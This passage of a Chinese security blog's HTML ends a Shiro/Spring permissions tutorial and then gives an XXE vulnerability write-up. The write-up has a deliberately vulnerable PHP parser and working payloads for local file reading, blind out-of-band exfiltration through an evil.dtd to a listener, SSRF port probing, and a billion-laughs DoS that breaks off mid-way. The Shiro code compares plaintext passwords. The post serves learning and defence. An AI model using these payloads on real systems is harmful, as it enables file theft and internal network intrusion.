name=&quot;staticMethod&quot;</span><br><span class="line">				  value=&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;arguments&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;databaseRealm&quot; class=&quot;com.how2java.realm.DatabaseRealm&quot;&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- 保证实现了Shiro内部lifecycle函数的bean执行 --&gt;</span><br><span class="line">	&lt;bean id=&quot;lifecycleBeanPostProcessor&quot; class=&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot; /&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<h3 id="springMVC-xml"><a href="#springMVC-xml" class="headerlink" title="springMVC.xml"></a>springMVC.xml</h3><p>1.springmvc的基本配置<br>2.增加对shiro的支持(这样在控制器<code>@Controller</code>上,使用像<code>@RequireRole</code>这样的注解,来表示某个方法必须有相关的角色才能访问。<code>@RequiresPermissions(&quot;deleteOrder&quot;)</code>表示具有<code>deleteOrder</code>的权限才能访问)<br>3.指定了异常处理类<code>DefaultExceptionHandler</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--启用shiro注解 --&gt;</span><br><span class="line">&lt;bean</span><br><span class="line">	class=&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot;</span><br><span class="line">	depends-on=&quot;lifecycleBeanPostProcessor&quot;&gt;</span><br><span class="line">	&lt;property name=&quot;proxyTargetClass&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;bean</span><br><span class="line">	class=&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt;</span><br><span class="line">	&lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h3 id="PageController与LoginController"><a href="#PageController与LoginController" class="headerlink" title="PageController与LoginController"></a>PageController与LoginController</h3><p>因为使用SSM,所以Jsp文件都放在WEB-INF/jsp下面,而这个位置是无法通过浏览器直接访问的,所以专门做这么一个类,便于访问这些Jsp页面。且使用<strong>权限注解</strong>:<code>@RequiresRoles(&quot;admin&quot;)  @RequiresPermissions(&quot;deleteOrder&quot;)</code>表明访问deletePro需要admin角色,访问deleteOrder需要权限<strong>deleteOrder</strong><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.33.45-image.png" alt="2019-03-02.20.33.45-image.png"><br>LoginController.java<br>获取客户端传输过来的账号密码进行验证,正确则跳转到index,错误则返回login.jsp<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.39.01-image.png" alt="2019-03-02.20.39.01-image.png"></p>
<h3 id="DatabaseRealm"><a href="#DatabaseRealm" class="headerlink" title="DatabaseRealm"></a>DatabaseRealm</h3><p>真正做验证与授权的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public class DatabaseRealm extends AuthorizingRealm &#123;</span><br><span class="line"></span><br><span class="line">	@Autowired</span><br><span class="line">	private UserService userService;</span><br><span class="line">	@Autowired</span><br><span class="line">	private RoleService roleService;</span><br><span class="line">	@Autowired</span><br><span class="line">	private PermissionService permissionService;</span><br><span class="line"></span><br><span class="line">	//授权</span><br><span class="line">	@Override</span><br><span class="line">	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;</span><br><span class="line">		//能进入到这里，表示账号已经通过验证了</span><br><span class="line">		String userName =(String) principalCollection.getPrimaryPrincipal();</span><br><span class="line">		//通过service获取用户的角色和权限</span><br><span class="line">		Set&lt;String&gt; permissions = permissionService.listPermissions(userName);</span><br><span class="line">		Set&lt;String&gt; roles = roleService.listRoles(userName);</span><br><span class="line">		</span><br><span class="line">		//授权对象</span><br><span class="line">		SimpleAuthorizationInfo s = new SimpleAuthorizationInfo();</span><br><span class="line">		//把通过service获取到的角色和权限放进去</span><br><span class="line">		s.setStringPermissions(permissions);</span><br><span class="line">		s.setRoles(roles);</span><br><span class="line">		return s;</span><br><span class="line">	&#125;</span><br><span class="line">	//认证</span><br><span class="line">	@Override</span><br><span class="line">	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;</span><br><span class="line">		//获取账号密码</span><br><span class="line">		System.out.println(&quot;调用认证方法&quot;);</span><br><span class="line">		UsernamePasswordToken t = (UsernamePasswordToken) token;</span><br><span class="line">		String userName= token.getPrincipal().toString();</span><br><span class="line">		String password= new String( t.getPassword());</span><br><span class="line">		//获取数据库中的密码</span><br><span class="line">		String passwordInDB = userService.getPassword(userName);</span><br><span class="line">		//如果为空就是账号不存在，如果不相同就是密码错误，但是都抛出AuthenticationException，而不是抛出具体错误原因，免得给破解者提供帮助信息</span><br><span class="line">		if(null==passwordInDB || !passwordInDB.equals(password)) </span><br><span class="line">			throw new AuthenticationException();</span><br><span class="line">		</span><br><span class="line">		//认证信息里存放账号密码, getName() 是当前Realm的继承方法,通常返回当前类名 :databaseRealm</span><br><span class="line">		SimpleAuthenticationInfo a = new SimpleAuthenticationInfo(userName,password,getName());</span><br><span class="line">		return a;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异常处理DefaultExceptionHandler"><a href="#异常处理DefaultExceptionHandler" class="headerlink" title="异常处理DefaultExceptionHandler"></a>异常处理DefaultExceptionHandler</h3><p>当发生了UnauthorizedException 异常的时候,就表示访问了无授权的资源,那么就会跳转到unauthorized.jsp，而在unauthorized.jsp中就会把变量ex取出来。                        </p>
<h5 id="异常处理的声明"><a href="#异常处理的声明" class="headerlink" title="异常处理的声明"></a>异常处理的声明</h5><p>在SpringMVC.xml中声明:            </p>
<pre><code>&lt;bean id=&quot;exceptionHandlerExceptionResolver&quot; class=&quot;org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver&quot;&gt;
&lt;/bean&gt;
&lt;bean class=&quot;com.how2java.exception.DefaultExceptionHandler&quot;/&gt; 
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.05.21-image.png" alt="2019-03-02.20.05.21-image.png"></p>
<p>上面演示的是基于注解方式的,哪里需要权限,加上<code>@RequirePermission</code>与<code>@RequireRole</code>就行,但是在做一些中大项目时,这种方式就有了局限性,即每次权限配置更改后,都要进行修改代码,重新编译。这种方式肯定是不好的。所以,我们可以通过另外一种动态配置,基于URL的配置权限。                                </p>
<h2 id="基于URL的配置权限"><a href="#基于URL的配置权限" class="headerlink" title="基于URL的配置权限"></a>基于URL的配置权限</h2><p>上面的代码进行讲解:                </p>
<h4 id="1-先将基于注释的权限配置语句删除"><a href="#1-先将基于注释的权限配置语句删除" class="headerlink" title="1.先将基于注释的权限配置语句删除"></a>1.先将基于注释的权限配置语句删除</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.14.51.33-image.png" alt="2019-03-03.14.51.33-image.png"></p>
<h4 id="2-在PermissionService新增方法"><a href="#2-在PermissionService新增方法" class="headerlink" title="2.在PermissionService新增方法"></a>2.在PermissionService新增方法</h4><p>新增两个方法<code>needInterceptor(String url) listPermissionUrls(String username)</code>,其功能为判断传入的url是否需要权限才能访问与根据username列出用户所能访问的url集合    </p>
<p>在PermissionServiceImpl中实现这两个函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public boolean needIntercepter(String requestUrl) &#123;</span><br><span class="line">        List&lt;Permission&gt; permissions = list();</span><br><span class="line">        for (Permission permission : permissions)&#123;</span><br><span class="line">            if(permission.getUrl().equals(requestUrl))&#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Set&lt;String&gt; listPermissionUrls(String userName) &#123;</span><br><span class="line">        Set&lt;String&gt; result = new HashSet&lt;&gt;();</span><br><span class="line">        List&lt;Role&gt; roles = roleService.listRoles(userName);</span><br><span class="line">        List&lt;RolePermission&gt; rolePermissions = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        for (Role role : roles) &#123;</span><br><span class="line">            RolePermissionExample example = new RolePermissionExample();</span><br><span class="line">            example.createCriteria().andRidEqualTo(role.getId());</span><br><span class="line">            List&lt;RolePermission&gt; rps= rolePermissionMapper.selectByExample(example);</span><br><span class="line">            rolePermissions.addAll(rps);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (RolePermission rolePermission : rolePermissions) &#123;</span><br><span class="line">            Permission p = permissionMapper.selectByPrimaryKey(rolePermission.getPid());</span><br><span class="line">            result.add(p.getUrl());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="3-url过滤器URLPathMatchingFilter"><a href="#3-url过滤器URLPathMatchingFilter" class="headerlink" title="3.url过滤器URLPathMatchingFilter"></a>3.url过滤器URLPathMatchingFilter</h4><p>继承自shiro的内置过滤器PathMatchingFilter。<br>思路:</p>
<pre><code>a.如果没有登陆,就跳转到登陆界面        
b.如果当前访问路径不在权限系统维护就允许访问        
c.当前用户拥有的权限路径不包含访问地址,则跳转到/unauthorized,否则就允许访问。            
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package com.how2java.filter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.how2java.service.PermissionService;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authz.UnauthorizedException;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.apache.shiro.web.filter.PathMatchingFilter;</span><br><span class="line">import org.apache.shiro.web.util.WebUtils;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.util.Set;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@WebFilter(filterName = &quot;URLPathMatchingFilter&quot;)</span><br><span class="line">public class URLPathMatchingFilter extends PathMatchingFilter &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    PermissionService permissionService;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123;</span><br><span class="line">        String requestURL = getPathWithinApplication(request);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        //判断是否登陆</span><br><span class="line">        if(!subject.isAuthenticated())&#123;</span><br><span class="line">            //未登陆 跳转到登陆页面</span><br><span class="line">            WebUtils.issueRedirect(request,response,&quot;/login&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //判断url权限</span><br><span class="line">        boolean needPermission = permissionService.needIntercepter(requestURL);</span><br><span class="line">        if(!needPermission)&#123;</span><br><span class="line">            //不需验证 放行</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            boolean hasPermission = false;</span><br><span class="line">            String username = subject.getPrincipal().toString();</span><br><span class="line">            Set&lt;String&gt; permissionUrls = permissionService.listPermissionUrls(username);</span><br><span class="line">            for(String url : permissionUrls)&#123;</span><br><span class="line">                if (url.equals(requestURL))&#123;</span><br><span class="line">                    hasPermission = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (hasPermission)</span><br><span class="line">                return true;</span><br><span class="line">            else &#123;</span><br><span class="line">                UnauthorizedException ex = new UnauthorizedException(&quot;当前用户没有访问路径:&quot; + requestURL + &quot;的权限&quot;);</span><br><span class="line">                subject.getSession().setAttribute(&quot;ex&quot;,ex);</span><br><span class="line">                WebUtils.issueRedirect(request,response,&quot;/unauthorized&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.onPreHandle(request, response, mappedValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-applicationContext-shiro-xml"><a href="#4-applicationContext-shiro-xml" class="headerlink" title="4.applicationContext-shiro.xml"></a>4.applicationContext-shiro.xml</h4><p>在配置文件中声明URL过滤器及过滤规则<br> <!-- url过滤器 --></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;urlPathMatchingFilter&quot; class=&quot;com.how2java.filter.URLPathMatchingFilter&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;entry key=&quot;url&quot; value-ref=&quot;urlPathMatchingFilter&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--所有的请求(除去配置的静态资源请求或请求地址为anon的请求)都要通过过滤器url --&gt;</span><br><span class="line">            /** = url</span><br></pre></td></tr></table></figure>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>配置好tomcat启动后访问:<code>http://localhost:8080/listProduct</code>,由于没有登陆就会跳转到我们配置好的登陆页面<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.27.14-image.png" alt="2019-03-03.15.27.14-image.png"></p>
<p>若当前登陆用户无访问路径的权限:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.26.59-image.png" alt="2019-03-03.15.26.59-image.png"></p>
<p>完成上面的代码后,对Shiro有了一定的了解,更多的东西以后再分享。                </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/27/xxe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/27/xxe/" itemprop="url">XXE漏洞总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-27T08:15:41+08:00">
                2019-02-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。</p>
</blockquote>
<hr>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>xml基础知识:<a href="https://p0rz9.github.io/2018/11/08/java_web_xml/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/11/08/java_web_xml/</a><br><strong>DTD</strong>:<br>XML文档包括XML声明,DTD文档类型定义(可选),文档元素。        </p>
<pre><code>内部声明DTD:    
    &lt;!DOCTYPE 根元素 [元素声明]&gt;

引用外部DTD:
    &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
</code></pre><p>DTD中的关键字:            </p>
<pre><code>DOCTYPE(声明)    
ENTITY(实体声明)        
SYSTEM PUBLIC(外部资源申请)            
</code></pre><p>实体类别:</p>
<pre><code>参数实体(用%声明,用%引用。 DTD中声明,DTD中引用)            
其余实体(直接用实体名称声明,使用&amp;引用。  DTD中声明,xml中引用)                
</code></pre><p><strong>举例</strong></p>
<pre><code>内部实体:            
&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;    

外部实体:
&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;        

参数实体:
&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;    
或
&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;
</code></pre><p>注:参数实体是在<strong>DTD中</strong>引用的,而其余实体是在<strong>xml文档</strong>中引用的。        </p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>xml外部实体注入(XML External Entity)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<h3 id="构建外部实体注入"><a href="#构建外部实体注入" class="headerlink" title="构建外部实体注入"></a>构建外部实体注入</h3><p>构建外部实体注入共有3种方法    </p>
<h4 id="有回显读本地敏感文件-Normal-XXE"><a href="#有回显读本地敏感文件-Normal-XXE" class="headerlink" title="有回显读本地敏感文件(Normal XXE)"></a>有回显读本地敏感文件(Normal XXE)</h4><p>xml.php</p>
<pre><code>&lt;?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents(&apos;php://input&apos;);
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?&gt;
</code></pre><p>payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [ 
    &lt;!ENTITY b SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; 
]&gt;
&lt;c&gt;&amp;b;&lt;/c&gt;
</code></pre><p>结果如下<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.36.44-image.png" alt="2019-02-27.08.36.44-image.png"></p>
<p>上面可以读取到数据是基于文件内容没有什么特殊符号,我们新建个test.txt文件,复制刚才的内容,再加上几个<code>&lt; &gt;</code>符号(<strong>如下所示</strong>)                </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-26.18.07.59-image.png" alt="2019-02-26.18.07.59-image.png"></p>
<p><strong>我们读取一下</strong>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.44.59-image.png" alt="2019-02-27.08.44.59-image.png"></p>
<p>发现报错了,因为txt文件的&lt;字符会被xml解析器当作新元素的开始,那如何解决这个问题,我们需要了解一下:<a href="http://www.w3school.com.cn/xml/xml_cdata.asp" target="_blank" rel="noopener">CDATA</a></p>
<blockquote>
<p>CDATA指的是不应由XML解析器进行解析的文本数据。CADATA中的所有内容都会被XML解析器忽略。</p>
</blockquote>
<p>那在这里我们就可以把读出来的数据放在CDATA中输出进行绕过。由于在XML并不支持多个实体连续引用,而必须在<strong>DTD中拼接好</strong>，然后在XML中进行引用。在DTD中拼接，只能使用参数实体，payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:///C:/Windows/test.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt; 
%dtd; ]&gt; 

&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
</code></pre><p>evil.dtd</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre><p>成功读取到含有特殊字符的文件内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.11.59-image.png" alt="2019-02-27.09.11.59-image.png"></p>
<h4 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h4><h5 id="外带请求读取文件"><a href="#外带请求读取文件" class="headerlink" title="外带请求读取文件"></a>外带请求读取文件</h5><p>想要外带就必须发出请求，我们可以在外部实体定义或者参数实体定义时，但是光请求还不够，我们需要把第一次请求的数据传出去，就是说，我们需要在”<strong>请求中引用另一个请求的结果</strong>“，我们只有用参数实体才可以满足要求(且参数实体必须在DTD中引用)</p>
<p>xml.php</p>
<pre><code>&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?&gt;
</code></pre><p>evil.dtd</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Windows/test.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://127.0.0.1:1223?p=%file;&apos;&gt;&quot;&gt;
</code></pre><p>payload:</p>
<pre><code>http://127.0.0.1:83/xml.php
post:
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
</code></pre><p>我们先监听1223端口,然后执行我们的payload，执行结果:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.45.31-image.png" alt="2019-02-27.09.45.31-image.png"></p>
<p>我们可以看到接收了我们base64编码(为了不破坏原来的XML语法)后的文件内容,我们解码后即为test.txt内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.51.44-image.png" alt="2019-02-27.09.51.44-image.png"></p>
<p>调用过程:<br>在payload中看到连续调用了三个请求实体%remote;%int;%send;,首先%remote先调用,调用后请求83端口的evil.dtd文件，然后%int调用test.dtd中的%file,%file就会去获取服务器上的test.txt文件，然后将返回的结果进行base64编码再填充到%send中(实体内容不能有%,所以进行html编码为<code>&amp;#37;</code>)，调用%send，将内容发到我们监听的服务器上(这里我用本机演示的)，这就实现了外带数据的效果，解决了XXE无回显的问题。</p>
<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>这是XXE攻击最基本的使用方式,我们在上面的例子可以看到。        </p>
<h4 id="SSRF-内网主机、端口探测"><a href="#SSRF-内网主机、端口探测" class="headerlink" title="SSRF/内网主机、端口探测"></a>SSRF/内网主机、端口探测</h4><p>SSRF(服务器请求伪造)，<br>利用SSRF,我们可以使用更多的协议来进行漏洞测试,我们先了解不同平台对应可用的协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.27.49-image.png" alt="2019-02-27.11.27.49-image.png"></p>
<p>PHP在安装扩展以后还能支持以下协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.44.51-image.png" alt="2019-02-27.11.44.51-image.png"></p>
<p><strong>主机探测</strong></p>
<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
    &lt;!DOCTYPE ANY [
        &lt;!ENTITY f SYSTEM &quot;http://10.10.10.1&quot;&gt;
    ]&gt;
    &lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><p>对ip地址进行探测或者使用FTP协议探测(下文会提及)</p>
<p><strong>端口探测</strong><br>由上面知道了网端的开放信息,接下来我们就进一步探测存活网段的端口:</p>
<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;http://127.0.0.1:80&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.12.12.06-image.png" alt="2019-02-27.12.12.06-image.png"></p>
<h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
  &lt;!DOCTYPE lolz [
    &lt;!ENTITY lol &quot;lol&quot;&gt;
    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
